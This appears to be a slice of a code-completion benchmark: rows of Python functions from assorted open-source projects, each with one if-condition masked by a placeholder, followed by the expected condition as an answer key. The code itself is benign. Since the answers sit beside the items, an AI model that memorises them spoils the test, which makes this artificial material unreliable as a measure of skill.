2696,"def test_loss_diff(self):<tab>losses = []<tab>for use_cuda in [True, False]:<tab><tab>for use_py_func_op in [True, False]:<tab><tab><tab>L = test_main(use_cuda, use_py_func_op, self.use_parallel_executor)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>losses.append(L)<tab>for idx in six.moves.range(len(losses) - 1):<tab><tab>max_diff = np.max(np.abs(losses[idx] - losses[0]))<tab><tab>self.assertAlmostEqual(max_diff, 0, delta=1e-3)",if L is not None :,157
2697,"def check_file(f, path):<tab>if not (ignore_substring and ignore_substring in f):<tab><tab>if substring in f:<tab><tab><tab>compl_path = os.path.join(path, f)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return compl_path<tab>return False",if os . path . isfile ( compl_path ) :,83
2698,"def is_valid_block(self):<tab>""""""check wheter the block is valid in the current position""""""<tab>for i in range(self.block.x):<tab><tab>for j in range(self.block.x):<tab><tab><tab>if self.block.get(i, j):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return False<tab><tab><tab><tab>if self.block.pos.x + i >= COLUMNS:<tab><tab><tab><tab><tab>return False<tab><tab><tab><tab>if self.block.pos.y + j < 0:<tab><tab><tab><tab><tab>return False<tab><tab><tab><tab>if self.map.get((self.block.pos.x + i, self.block.pos.y + j), False):<tab><tab><tab><tab><tab>return False<tab>return True",if self . block . pos . x + i < 0 :,192
2699,"def is_fail_state(state):<tab>if type(<tab><tab>state.addr<tab>) == SootAddressDescriptor and state.addr.method == SootMethodDescriptor.from_soot_method(<tab><tab>onclick_method<tab>):<tab><tab>sols = state.solver.eval_upto(state.memory_soot.stack.load(""$z0""), 2)<tab><tab>assert len(sols) == 1<tab><tab><IF-STMT><tab><tab><tab>return True<tab>return False",if sols [ 0 ] == 0 :,118
2700,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 8:<tab><tab><tab>self.add_delete_status(d.getVarInt32())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 0 :,92
2701,"def _init_weight(self):<tab>for m in self.modules():<tab><tab><IF-STMT><tab><tab><tab>n = m.kernel_size[0] * m.kernel_size[1] * m.out_channels<tab><tab><tab>m.weight.data.normal_(0, math.sqrt(2.0 / n))<tab><tab>elif isinstance(m, SyncBatchNorm):<tab><tab><tab>m.weight.data.fill_(1)<tab><tab><tab>m.bias.data.zero_()<tab><tab>elif isinstance(m, nn.BatchNorm2d):<tab><tab><tab>m.weight.data.fill_(1)<tab><tab><tab>m.bias.data.zero_()","if isinstance ( m , nn . Conv2d ) :",162
2702,"def wrapper(*args, **kwargs):<tab>global _exception<tab>try:<tab><tab>fn(*args, **kwargs)<tab>except Exception:<tab><tab>_exception = sys.exc_info()<tab><tab>et, ev, tb = _exception<tab><tab>if getattr(ev, ""filename"", None) is None:<tab><tab><tab># get the filename from the last item in the stack<tab><tab><tab>filename = traceback.extract_tb(tb)[-1][0]<tab><tab>else:<tab><tab><tab>filename = ev.filename<tab><tab><IF-STMT><tab><tab><tab>_error_files.append(filename)<tab><tab>raise",if filename not in _error_files :,148
2703,"def purge_messages(self):<tab>with self.app.connection_for_write() as connection:<tab><tab>count = self.app.control.purge(connection=connection)<tab><tab><IF-STMT>  # pragma: no cover<tab><tab><tab>print(<tab><tab><tab><tab>""purge: Erased {0} {1} from the queue.\n"".format(<tab><tab><tab><tab><tab>count, pluralize(count, ""message"")<tab><tab><tab><tab>)<tab><tab><tab>)",if count :,109
2704,"def read_series(rec):<tab>found = []<tab>for tag in (""440"", ""490"", ""830""):<tab><tab>fields = rec.get_fields(tag)<tab><tab>if not fields:<tab><tab><tab>continue<tab><tab>for f in fields:<tab><tab><tab>this = []<tab><tab><tab>for k, v in f.get_subfields([""a"", ""v""]):<tab><tab><tab><tab>if k == ""v"" and v:<tab><tab><tab><tab><tab>this.append(v)<tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>v = v.rstrip("".,; "")<tab><tab><tab><tab>if v:<tab><tab><tab><tab><tab>this.append(v)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>found += ["" -- "".join(this)]<tab>return found",if this :,182
2705,def calc_position_values(positions):<tab>values = []<tab>for position in positions:<tab><tab><IF-STMT><tab><tab><tab># Futures don't have an inherent position value.<tab><tab><tab>values.append(0.0)<tab><tab>else:<tab><tab><tab>values.append(position.last_sale_price * position.amount)<tab>return values,"if isinstance ( position . asset , Future ) :",92
2706,"def _loc(obj):<tab>try:<tab><tab>fn = getattr(obj, ""__file__"", None)<tab><tab>if fn is not None:<tab><tab><tab>return "" @%s"" % (fn,)<tab><tab>obj = getattr(obj, ""im_func"", obj)<tab><tab>code = getattr(obj, ""__code__"", None)<tab><tab><IF-STMT><tab><tab><tab>return "" @%s:%s"" % (code.co_filename, code.co_firstlineno)<tab>except Exception:<tab><tab>pass<tab>return """"",if code is not None :,126
2707,"def _convert_user_into_remote(self, username, exclude=[""all""]):<tab># builds a ref with an username and a branch<tab># this method parses the repository's remotes to find the url matching username<tab># and containing the given branch and returns the corresponding ref<tab>remotes = {remote.name: list(remote.urls) for remote in self.repository.remotes}<tab>for name in (self.name, ""upstream"") + tuple(remotes.keys()):<tab><tab>if name in remotes and name not in exclude:<tab><tab><tab>for url in remotes[name]:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>yield name","if self . fqdn in url and username == url . split ( ""/"" ) [ - 2 ] . split ( "":"" ) [ - 1 ] :",169
2708,"def _render_ib_interfaces(cls, network_state, iface_contents, flavor):<tab>ib_filter = renderer.filter_by_type(""infiniband"")<tab>for iface in network_state.iter_interfaces(ib_filter):<tab><tab><IF-STMT><tab><tab>iface_cfg = iface_contents[iface_name]<tab><tab>iface_cfg.kind = ""infiniband""<tab><tab>iface_subnets = iface.get(""subnets"", [])<tab><tab>route_cfg = iface_cfg.routes<tab><tab>cls._render_subnets(<tab><tab><tab>iface_cfg, iface_subnets, network_state.has_default_route, flavor<tab><tab>)<tab><tab>cls._render_subnet_routes(iface_cfg, route_cfg, iface_subnets, flavor)","iface_name = iface [ ""name"" ]",193
2709,"def _extract_level(self):<tab>""""""Extract level and component if available (lazy).""""""<tab>if self._level is None:<tab><tab>split_tokens = self.split_tokens<tab><tab>if not split_tokens:<tab><tab><tab>self._level = False<tab><tab><tab>self._component = False<tab><tab><tab>return<tab><tab>x = (<tab><tab><tab>self.log_levels.index(split_tokens[1])<tab><tab><tab>if split_tokens[1] in self.log_levels<tab><tab><tab>else None<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>self._level = split_tokens[1]<tab><tab><tab>self._component = split_tokens[2]<tab><tab>else:<tab><tab><tab>self._level = False<tab><tab><tab>self._component = False",if x is not None :,185
2710,"def addnode(self, parent, data):<tab>print(""aaa"", data)<tab>for i in data:<tab><tab>print(i)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if isinstance(i, tuple):<tab><tab><tab>item = self.tre_plugins.AppendItem(parent, i[0].title)<tab><tab><tab>self.tre_plugins.SetItemData(item, i[0])<tab><tab><tab>self.addnode(item, i[1])<tab><tab>else:<tab><tab><tab>item = self.tre_plugins.AppendItem(parent, i[0].title)<tab><tab><tab>self.tre_plugins.SetItemData(item, i[0])","if i == ""-"" :",159
2711,"def getdsturl(tcpdata):<tab>import logging<tab>log = logging.getLogger(""getdsturl"")<tab>p = parseHeader(tcpdata, type=""request"")<tab>if p is None:<tab><tab>log.warn(""parseHeader returned None"")<tab><tab>return<tab>if p.has_key(""uri"") and p.has_key(""headers""):<tab><tab><IF-STMT><tab><tab><tab>r = ""http://%s%s"" % (p[""headers""][""host""][0], p[""uri""])<tab><tab><tab>return r<tab><tab>else:<tab><tab><tab>log.warn(""seems like no host header was set"")<tab>else:<tab><tab>log.warn(""parseHeader did not give us a nice return %s"" % p)","if p [ ""headers"" ] . has_key ( ""host"" ) :",176
2712,"def assert_not_none(obj, msg=None, values=True):<tab>""""""Fail the test if given object is None.""""""<tab>_msg = ""is None""<tab>if obj is None:<tab><tab>if msg is None:<tab><tab><tab>msg = _msg<tab><tab><IF-STMT><tab><tab><tab>msg = ""%s: %s"" % (msg, _msg)<tab><tab>_report_failure(msg)",elif values is True :,99
2713,"def sort(self):<tab>sorted_models = []<tab>concrete_models = set()<tab>models = list(self.data)<tab>while len(sorted_models) < len(models):<tab><tab>found = False<tab><tab>for model in models:<tab><tab><tab>if model in sorted_models:<tab><tab><tab><tab>continue<tab><tab><tab>dependencies = self.dependencies.get(model._meta.concrete_model)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>sorted_models.append(model)<tab><tab><tab><tab>concrete_models.add(model._meta.concrete_model)<tab><tab><tab><tab>found = True<tab><tab>if not found:<tab><tab><tab>return<tab>self.data = OrderedDict((model, self.data[model]) for model in sorted_models)",if not ( dependencies and dependencies . difference ( concrete_models ) ) :,188
2714,"def load_vocab_dict(vocab_file_path):<tab>""""""Load vocabs, vocab: {""word"": 1, ...}""""""<tab>logging.info(""Loading vocab from {}"".format(vocab_file_path))<tab>with open(vocab_file_path, encoding=""utf-8"") as in_f:<tab><tab>vocabs = {}<tab><tab>for line in in_f:<tab><tab><tab>parts = line.rstrip().split(""\t"")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>vocabs[parts[0]] = parts[1]<tab>logging.info(""Loded {} vocabs from {}"".format(len(vocabs), vocab_file_path))<tab>return vocabs",if len ( parts ) < 2 :,161
2715,"def get_layers_from_suite(self, suite, suiteClass):<tab>top_layer = suiteClass()<tab>layers_dict = OrderedDict()<tab>for test in self.flatten_suite(suite):<tab><tab>layer = getattr(test, ""layer"", None)<tab><tab><IF-STMT><tab><tab><tab>if layer not in layers_dict:<tab><tab><tab><tab>layers_dict[layer] = LayerSuite(self.session, layer=layer)<tab><tab><tab>layers_dict[layer].addTest(test)<tab><tab>else:<tab><tab><tab>top_layer.addTest(test)<tab>self.get_parent_layers(layers_dict)<tab>return top_layer, layers_dict",if layer :,159
2716,"def team_scores(self, team_scores, time):<tab>""""""Store output of team scores to a JSON file""""""<tab>data = []<tab>for score in team_scores[""fixtures""]:<tab><tab><IF-STMT><tab><tab><tab>item = {<tab><tab><tab><tab>""date"": score[""date""].split(""T"")[0],<tab><tab><tab><tab>""homeTeamName"": score[""homeTeamName""],<tab><tab><tab><tab>""goalsHomeTeam"": score[""result""][""goalsHomeTeam""],<tab><tab><tab><tab>""goalsAwayTeam"": score[""result""][""goalsAwayTeam""],<tab><tab><tab><tab>""awayTeamName"": score[""awayTeamName""],<tab><tab><tab>}<tab><tab><tab>data.append(item)<tab>self.generate_output({""team_scores"": data})","if score [ ""status"" ] == ""FINISHED"" :",183
2717,"def run(self, root):<tab>footnotesDiv = self.footnotes.makeFootnotesDiv(root)<tab>if footnotesDiv is not None:<tab><tab>result = self.footnotes.findFootnotesPlaceholder(root)<tab><tab>if result:<tab><tab><tab>child, parent, isText = result<tab><tab><tab>ind = list(parent).index(child)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>parent.remove(child)<tab><tab><tab><tab>parent.insert(ind, footnotesDiv)<tab><tab><tab>else:<tab><tab><tab><tab>parent.insert(ind + 1, footnotesDiv)<tab><tab><tab><tab>child.tail = None<tab><tab>else:<tab><tab><tab>root.append(footnotesDiv)",if isText :,175
2718,"def delete_target_group(self, target_group_arn):<tab>if target_group_arn not in self.target_groups:<tab><tab>raise TargetGroupNotFoundError()<tab>target_group = self.target_groups[target_group_arn]<tab>if target_group:<tab><tab><IF-STMT><tab><tab><tab>raise ResourceInUseError(<tab><tab><tab><tab>""The target group '{}' is currently in use by a listener or a rule"".format(<tab><tab><tab><tab><tab>target_group_arn<tab><tab><tab><tab>)<tab><tab><tab>)<tab><tab>del self.target_groups[target_group_arn]<tab><tab>return target_group",if self . _any_listener_using ( target_group_arn ) :,161
2719,"def run_pending(self, now=None):<tab>""""""Runs the command if scheduled""""""<tab>now = now or datetime.now()<tab>if self.is_enabled():<tab><tab><IF-STMT><tab><tab><tab>self.last_run = now<tab><tab>next_time = self.schedule(self.last_run).get_next()<tab><tab>if next_time < now:<tab><tab><tab>self.last_run = now<tab><tab><tab>return self.run()<tab>return -1",if self . last_run is None :,119
2720,"def _fix_exception_context(new_exc, old_exc):<tab># Context may not be correct, so find the end of the chain<tab>while 1:<tab><tab>exc_context = new_exc.__context__<tab><tab><IF-STMT><tab><tab><tab># Context is already set correctly (see issue 20317)<tab><tab><tab>return<tab><tab>if exc_context is None or exc_context is frame_exc:<tab><tab><tab>break<tab><tab>new_exc = exc_context<tab># Change the end of the chain to point to the exception<tab># we expect it to reference<tab>new_exc.__context__ = old_exc",if exc_context is old_exc :,151
2721,"def delete_backend(<tab>self, backend_tag: BackendTag, force_kill: bool = False) -> Optional[GoalId]:<tab>async with self.write_lock:<tab><tab># Check that the specified backend isn't used by any endpoints.<tab><tab>for endpoint, info in self.endpoint_state.get_endpoints().items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ValueError(<tab><tab><tab><tab><tab>""Backend '{}' is used by endpoint '{}' ""<tab><tab><tab><tab><tab>""and cannot be deleted. Please remove ""<tab><tab><tab><tab><tab>""the backend from all endpoints and try ""<tab><tab><tab><tab><tab>""again."".format(backend_tag, endpoint)<tab><tab><tab><tab>)<tab><tab>return self.backend_state.delete_backend(backend_tag, force_kill)","if backend_tag in info [ ""traffic"" ] or backend_tag in info [ ""shadows"" ] :",199
2722,"def lint(self, request):<tab>try:<tab><tab>html_linter = UnwrapObject(self._koLintService.getLinterForLanguage(""HTML""))<tab><tab>return html_linter.lint(request, TPLInfo=self._tplPatterns)<tab>except:<tab><tab><IF-STMT><tab><tab><tab>self._checkValidVersion_complained[""lint""] = True<tab><tab><tab>log.exception(""Problem in koPHPLinter.lint"")<tab><tab>return koLintResults()","if ""lint"" not in self . _checkValidVersion_complained :",132
2723,"def get_commit(self, rev):<tab>""""""Get commit object identified by `rev` (SHA or branch or tag name).""""""<tab>for prefix in [""refs/heads/"", ""refs/tags/"", """"]:<tab><tab>key = prefix + rev<tab><tab>try:<tab><tab><tab>obj = self[encode_for_git(key)]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>obj = self[obj.object[1]]<tab><tab><tab>return obj<tab><tab>except KeyError:<tab><tab><tab>pass<tab>raise KeyError(rev)","if isinstance ( obj , dulwich . objects . Tag ) :",130
2724,"def get_host_metadata(self):<tab>meta = {}<tab>if self.agent_url:<tab><tab>try:<tab><tab><tab>resp = requests.get(self.agent_url, timeout=1).json().get(""config"", {})<tab><tab><tab><IF-STMT><tab><tab><tab><tab>meta[""nomad_version""] = resp.get(""Version"")<tab><tab><tab>if ""Region"" in resp:<tab><tab><tab><tab>meta[""nomad_region""] = resp.get(""Region"")<tab><tab><tab>if ""Datacenter"" in resp:<tab><tab><tab><tab>meta[""nomad_datacenter""] = resp.get(""Datacenter"")<tab><tab>except Exception as ex:<tab><tab><tab>self.log.debug(""Error getting Nomad version: %s"" % str(ex))<tab>return meta","if ""Version"" in resp :",185
2725,"def _waitFakenetStopped(self, timeoutsec=None):<tab>retval = False<tab>while True:<tab><tab><IF-STMT><tab><tab><tab>retval = True<tab><tab><tab>break<tab><tab>time.sleep(1)<tab><tab>if timeoutsec is not None:<tab><tab><tab>timeoutsec -= 1<tab><tab><tab>if timeoutsec <= 0:<tab><tab><tab><tab>break<tab>return retval",if self . _confirmFakenetStopped ( ) :,97
2726,"def send_message(self, message):<tab>smtp = smtplib.SMTP(self.smtp_host, self.smtp_port)<tab>try:<tab><tab>smtp.ehlo()<tab><tab>if self.smtp_tls:<tab><tab><tab>smtp.starttls()<tab><tab><IF-STMT><tab><tab><tab>smtp.login(self.smtp_user, self.smtp_password)<tab><tab>smtp.sendmail(self.from_user, self.recipients, message.as_string())<tab>finally:<tab><tab>smtp.close()",if self . smtp_user :,125
2727,"def set_tracker_icon(tracker_icon, cell):<tab>if tracker_icon:<tab><tab>pixbuf = tracker_icon.get_cached_icon()<tab><tab><IF-STMT><tab><tab><tab>pixbuf = get_pixbuf_at_size(tracker_icon.get_filename(), 16)<tab><tab><tab>tracker_icon.set_cached_icon(pixbuf)<tab>else:<tab><tab>pixbuf = create_blank_pixbuf()<tab># Suppress Warning: g_object_set_qdata: assertion `G_IS_OBJECT (object)' failed<tab>with warnings.catch_warnings():<tab><tab>warnings.simplefilter(""ignore"")<tab><tab>cell.set_property(""pixbuf"", pixbuf)",if pixbuf is None :,165
2728,"def __create_index(self, collection, index, unique):<tab>doc = collection.find_one(projection={""_id"": 1})<tab>if doc is None:<tab><tab>try:<tab><tab><tab>indexes = list(collection.list_indexes())<tab><tab>except OperationFailure:<tab><tab><tab>indexes = []<tab><tab><IF-STMT><tab><tab><tab>collection.create_index(index, unique=unique)",if index not in indexes :,97
2729,"def read_oclc(fields):<tab>if ""035"" not in fields:<tab><tab>return {}<tab>found = []<tab>for line in fields[""035""]:<tab><tab>for v in get_subfield_values(line, [""a""]):<tab><tab><tab>m = re_oclc.match(v)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>oclc = m.group(1)<tab><tab><tab>if oclc not in found:<tab><tab><tab><tab>found.append(oclc)<tab>return {""oclc_number"": found} if found else {}",if not m :,143
2730,"def closest_enemy_ant(self, row1, col1, filter=None):<tab># find the closest enemy ant from this row/col<tab>min_dist = maxint<tab>closest_ant = None<tab>for ant in self.enemy_ants():<tab><tab><IF-STMT><tab><tab><tab>dist = self.distance(row1, col1, ant[0][0], ant[0][1])<tab><tab><tab>if dist < min_dist:<tab><tab><tab><tab>min_dist = dist<tab><tab><tab><tab>closest_ant = ant[0]<tab>return closest_ant",if filter is None or ant not in filter :,146
2731,"def fromVariant(variant):<tab>if hasattr(QtCore, ""QVariant"") and isinstance(variant, QtCore.QVariant):<tab><tab>t = variant.type()<tab><tab>if t == QtCore.QVariant.String:<tab><tab><tab>return str(variant.toString())<tab><tab><IF-STMT><tab><tab><tab>return variant.toDouble()[0]<tab><tab>elif t == QtCore.QVariant.Int:<tab><tab><tab>return variant.toInt()[0]<tab><tab>elif t == QtCore.QVariant.Bool:<tab><tab><tab>return variant.toBool()<tab><tab>elif t == QtCore.QVariant.Invalid:<tab><tab><tab>return None<tab><tab>else:<tab><tab><tab>raise ValueError('Unsupported QVariant type ""%s""' % variant.typeName())<tab>else:<tab><tab>return variant",elif t == QtCore . QVariant . Double :,195
2732,"def _check_old_with_state(self):<tab>add_vec = False<tab>for op in self.ops:<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>op.get_coeff(0.0, self.args)<tab><tab><tab>except TypeError as e:<tab><tab><tab><tab>nfunc = _StateAsArgs(self.coeff)<tab><tab><tab><tab>op = EvoElement((op.qobj, nfunc, nfunc, ""func""))<tab><tab><tab><tab>add_vec = True<tab>if add_vec:<tab><tab>self.dynamics_args += [(""_state_vec"", ""vec"", None)]","if op . type == ""func"" :",155
2733,"def _read_readable(self, readable):<tab>blocksize = 8192<tab>if self.debuglevel > 0:<tab><tab>print(""sendIng a read()able"")<tab>encode = self._is_textIO(readable)<tab>if encode and self.debuglevel > 0:<tab><tab>print(""encoding file using iso-8859-1"")<tab>while True:<tab><tab>datablock = readable.read(blocksize)<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>if encode:<tab><tab><tab>datablock = datablock.encode(""iso-8859-1"")<tab><tab>yield datablock",if not datablock :,139
2734,"def read_chat_forever(reader, pub_socket):<tab>line = reader.readline()<tab>who = ""someone""<tab>while line:<tab><tab>print(""Chat:"", line.strip())<tab><tab>if line.startswith(""name:""):<tab><tab><tab>who = line.split("":"")[-1].strip()<tab><tab>try:<tab><tab><tab>pub_socket.send_pyobj((who, line))<tab><tab>except socket.error as e:<tab><tab><tab># ignore broken pipes, they just mean the participant<tab><tab><tab># closed its connection already<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise<tab><tab>line = reader.readline()<tab>print(""Participant left chat."")",if e [ 0 ] != 32 :,162
2735,"def _wrapped() -> None:<tab>should_run = app.is_leader() if on_leader else True<tab>if should_run:<tab><tab>with self.trace(shortlabel(fun), trace_enabled=traced):<tab><tab><tab># pass app only if decorated function takes an argument<tab><tab><tab><IF-STMT><tab><tab><tab><tab>task_takes_app = cast(Callable[[AppT], Awaitable], fun)<tab><tab><tab><tab>return await task_takes_app(app)<tab><tab><tab>else:<tab><tab><tab><tab>task = cast(Callable[[], Awaitable], fun)<tab><tab><tab><tab>return await task()",if inspect . signature ( fun ) . parameters :,151
2736,"def Decode(self, filedesc):<tab>while True:<tab><tab>chunk = filedesc.Read(4)<tab><tab>if not chunk:<tab><tab><tab>return<tab><tab>if chunk == b""QUUX"":<tab><tab><tab>yield b""NORF""<tab><tab><IF-STMT><tab><tab><tab>yield b""BLARGH""","if chunk == b""THUD"" :",82
2737,"def _get_modules(fn):<tab>finder = modulefinder.ModuleFinder()<tab>finder.run_script(fn)<tab>all = []<tab>for m in finder.modules.values():<tab><tab>if not isinstance(m, modulefinder.Module):<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab># skip shared object files<tab><tab>if m.__file__.endswith("".so""):<tab><tab><tab>continue<tab><tab># skip mac system stuff...<tab><tab># FIXME: would need to augment with  other OS's system stuff<tab><tab>if m.__file__.startswith(""/Library/Frameworks""):<tab><tab><tab>continue<tab><tab>all.append(m)<tab>return all",if not m . __file__ :,162
2738,"def _read(self, size):<tab>""""""Return size bytes from the stream.""""""<tab>if self.comptype == ""tar"":<tab><tab>return self.__read(size)<tab>c = len(self.dbuf)<tab>while c < size:<tab><tab>buf = self.__read(self.bufsize)<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>try:<tab><tab><tab>buf = self.cmp.decompress(buf)<tab><tab>except IOError:<tab><tab><tab>raise ReadError(""invalid compressed data"")<tab><tab>self.dbuf += buf<tab><tab>c += len(buf)<tab>buf = self.dbuf[:size]<tab>self.dbuf = self.dbuf[size:]<tab>return buf",if not buf :,167
2739,"def cluster_list(tokeniser):<tab>clusterids = []<tab>value = tokeniser()<tab>try:<tab><tab>if value == ""["":<tab><tab><tab>while True:<tab><tab><tab><tab>value = tokeniser()<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>break<tab><tab><tab><tab>clusterids.append(ClusterID(value))<tab><tab>else:<tab><tab><tab>clusterids.append(ClusterID(value))<tab><tab>if not clusterids:<tab><tab><tab>raise ValueError(""no cluster-id in the cluster list"")<tab><tab>return ClusterList(clusterids)<tab>except ValueError:<tab><tab>raise ValueError(""invalud cluster list"")","if value == ""]"" :",146
2740,"def from_data(cls, value, currency, includes_tax=None):<tab>if includes_tax is None:<tab><tab><IF-STMT><tab><tab><tab>msg = ""Missing includes_tax argument for %s.from_data""<tab><tab><tab>raise TypeError(msg % (cls.__name__,))<tab><tab>includes_tax = cls.includes_tax<tab>if includes_tax:<tab><tab>return TaxfulPrice(value, currency)<tab>else:<tab><tab>return TaxlessPrice(value, currency)",if cls . includes_tax is None :,121
2741,"def THUMB(image, nx=120, ny=120, gae=False, name=""thumb""):<tab>if image:<tab><tab><IF-STMT><tab><tab><tab>request = current.request<tab><tab><tab>from PIL import Image<tab><tab><tab>import os<tab><tab><tab>img = Image.open(os.path.join(request.folder, ""uploads"", image))<tab><tab><tab>img.thumbnail((nx, ny), Image.ANTIALIAS)<tab><tab><tab>root, ext = os.path.splitext(image)<tab><tab><tab>thumb = ""%s_%s%s"" % (root, name, ext)<tab><tab><tab>img.save(request.folder + ""uploads/"" + thumb)<tab><tab><tab>return thumb<tab><tab>else:<tab><tab><tab>return image",if not gae :,176
2742,"def _get_two_devices(self, require_same_type=False):<tab>tpus = extensions.tpu_devices()<tab>if FLAGS.requires_tpu:<tab><tab>if len(tpus) == 2:<tab><tab><tab>res = tpus<tab><tab>else:<tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""This test requires 2 TPU cores but %s are found"" % len(tpus)<tab><tab><tab>)<tab>else:<tab><tab>if len(tpus) == 2:<tab><tab><tab>res = tpus<tab><tab><IF-STMT><tab><tab><tab>res = (""CPU:0"", ""GPU:0"")<tab><tab>else:<tab><tab><tab>res = (""CPU:0"", ""CPU:1"")<tab>return res",elif self . _hasGPU ( ) and not require_same_type :,184
2743,"def _format_repos(self, value):<tab>result = {}<tab>if value:<tab><tab>for path, config in iteritems(value):<tab><tab><tab><IF-STMT><tab><tab><tab><tab># assume its a module<tab><tab><tab><tab>path = os.path.abspath(__import__(path).__file__)<tab><tab><tab>result[path] = config<tab>return result","if path [ 0 ] != ""/"" :",87
2744,"def skipIndent(self, s, i, width):<tab>ws = 0<tab>n = len(s)<tab>while i < n and ws < width:<tab><tab><IF-STMT><tab><tab><tab>ws += abs(self.tab_width) - (ws % abs(self.tab_width))<tab><tab>elif s[i] == "" "":<tab><tab><tab>ws += 1<tab><tab>else:<tab><tab><tab>break<tab><tab>i += 1<tab>return i","if s [ i ] == ""\t"" :",114
2745,"def get_assets_historical_range_close_price(<tab>self, start_dt, end_dt, asset_symbols, adjusted=False):<tab>"""""" """"""<tab>prices_df = None<tab>for ds in self.data_sources:<tab><tab>try:<tab><tab><tab>prices_df = ds.get_assets_historical_closes(<tab><tab><tab><tab>start_dt, end_dt, asset_symbols, adjusted=adjusted<tab><tab><tab>)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return prices_df<tab><tab>except Exception:<tab><tab><tab>raise<tab>return prices_df",if prices_df is not None :,145
2746,"def matchBrackets(string):<tab>rest = string[1:]<tab>inside = ""(""<tab>while rest != """" and not rest.startswith("")""):<tab><tab><IF-STMT><tab><tab><tab>(part, rest) = matchBrackets(rest)<tab><tab><tab>inside = inside + part<tab><tab>else:<tab><tab><tab>inside = inside + rest[0]<tab><tab><tab>rest = rest[1:]<tab>if rest.startswith("")""):<tab><tab>return (inside + "")"", rest[1:])<tab>raise AssertionError(""Unmatched bracket in string '"" + string + ""'"")","if rest . startswith ( ""("" ) :",122
2747,"def is_different(item, seen):<tab>is_diff = True<tab>if item not in seen:<tab><tab>for value in other:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>is_diff = False<tab><tab><tab><tab>break<tab><tab>if is_diff:<tab><tab><tab>seen.append(item)<tab>return is_diff","if comparator ( iteratee ( item ) , iteratee ( value ) ) :",91
2748,"def write_conditional_formatting(worksheet):<tab>""""""Write conditional formatting to xml.""""""<tab>wb = worksheet.parent<tab>for range_string, rules in iteritems(worksheet.conditional_formatting.cf_rules):<tab><tab>cf = Element(""conditionalFormatting"", {""sqref"": range_string})<tab><tab>for rule in rules:<tab><tab><tab>if rule.dxf is not None:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>rule.dxfId = len(wb._differential_styles)<tab><tab><tab><tab><tab>wb._differential_styles.append(rule.dxf)<tab><tab><tab>cf.append(rule.to_tree())<tab><tab>yield cf",if rule . dxf != DifferentialStyle ( ) :,164
2749,"def checkForFinishedThreads(self):<tab>""Mark terminated threads with endTime.""<tab>for t in self.unfinishedThreads:<tab><tab><IF-STMT><tab><tab><tab>t.endTime = time.process_time()<tab><tab><tab>if getattr(t, ""status"", None) is None:<tab><tab><tab><tab>t.status = ""ended""",if not t . is_alive ( ) :,84
2750,"def _process_dispatch_entries(self, dispatch_info_external):<tab>path_only_entries = []<tab>hostname_entries = []<tab>for entry in dispatch_info_external.dispatch:<tab><tab>parsed_url = dispatchinfo.ParsedURL(entry.url)<tab><tab><IF-STMT><tab><tab><tab>hostname_entries.append(entry)<tab><tab>else:<tab><tab><tab>path_only_entries.append((parsed_url, entry.server))<tab>if hostname_entries:<tab><tab>logging.warning(<tab><tab><tab>""Hostname routing is not supported by the development server. The ""<tab><tab><tab>""following dispatch entries will not match any requests:\n%s"",<tab><tab><tab>""\n\t"".join(str(entry) for entry in hostname_entries),<tab><tab>)<tab>self._entries = path_only_entries",if parsed_url . host :,196
2751,"def iter_ReassignParameters(self, inputNode, variables, nodeByID):<tab>for node in inputNode.getReassignParameterNodes(nodeByID):<tab><tab>yield from iterNodeCommentLines(node)<tab><tab>yield from iterInputConversionLines(node, variables)<tab><tab>socket = node.inputs[0]<tab><tab><IF-STMT><tab><tab><tab>expression = getCopyExpression(socket, variables)<tab><tab>else:<tab><tab><tab>expression = variables[socket]<tab><tab>if node.conditionSocket is None:<tab><tab><tab>conditionPrefix = """"<tab><tab>else:<tab><tab><tab>conditionPrefix = ""if {}: "".format(variables[node.conditionSocket])<tab><tab>yield ""{}{} = {}"".format(<tab><tab><tab>conditionPrefix, variables[node.linkedParameterSocket], expression<tab><tab>)",if socket . isUnlinked and socket . isCopyable ( ) :,192
2752,"def _feed_data(self, data_pair: types.Sequence, type_: str) -> types.Sequence:<tab>result = []<tab>type_list = [ChartType.LINES, ChartType.CUSTOM]<tab>if type_ in type_list:<tab><tab>result = data_pair<tab>else:<tab><tab>for n, v in data_pair:<tab><tab><tab>try:<tab><tab><tab><tab>lng, lat = self.get_coordinate(n)<tab><tab><tab><tab>result.append({""name"": n, ""value"": [lng, lat, v]})<tab><tab><tab>except TypeError as err:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>raise NonexistentCoordinatesException(err, (n, v))<tab>return result",if self . _is_ignore_nonexistent_coord is not True :,175
